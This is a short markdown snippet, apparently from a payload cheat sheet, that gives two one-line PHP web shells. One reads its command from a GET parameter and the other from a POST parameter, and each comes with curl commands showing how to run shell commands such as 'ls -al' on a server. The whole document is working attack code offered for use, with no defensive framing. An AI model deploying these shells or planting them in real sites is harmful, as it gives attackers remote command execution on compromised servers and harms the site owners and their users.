## Tiny PHP GET shell
#### get.php:
```php
<?=`$_GET[1]`;
```

#### Usage:
```
curl example.com/get.php?1=ls+-al
```

## Tiny PHP POST shell

#### post.php:
```php
<?=`$_POST[1]`;
```

#### Usage:
```
curl example.com/post.php -d '1=ls+-al'
```
